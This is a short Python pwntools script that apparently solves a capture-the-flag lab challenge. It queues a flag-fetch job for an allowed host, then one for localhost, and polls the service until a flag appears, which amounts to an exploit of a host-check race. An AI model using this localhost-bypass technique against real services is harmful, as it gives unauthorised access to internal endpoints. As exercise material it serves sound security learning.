#!/usr/bin/env python3

import pwn
import time

if __name__ == '__main__':
#	r = pwn.process('./a.out')
	r = pwn.remote('up.zoolab.org', 10932)

	while True:
		a = '''
[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? '''
		p = r.recvuntil(a.encode()).decode()
		print(p)

		s = '''g
up.zoolab.org/10000
g
localhost/10000
'''
		print(s)
		r.send(s.encode())

		for i in range(2):
			s = '==== Menu ===='
			p = r.recvuntil(s.encode()).decode()
			print(p)

		while True:
			p = r.recvuntil(a.encode()).decode()
			print(p)

			s = 'c\n'; print(s); r.send(s.encode())

			s = '==== Menu ===='
			p = r.recvuntil(s.encode()).decode()
			print(p)

			if p == '\n==== Pending Jobs ====\n\n\n==== Menu ====':
				break

			time.sleep(1)

		p = r.recvuntil(a.encode()).decode()
		print(p)

		s = 'v\n'; print(s); r.send(s.encode())

		s = '==== Menu ===='
		p = r.recvuntil(s.encode()).decode()
		print(p)

		if 'FLAG{' in p:
			break

	r.interactive()
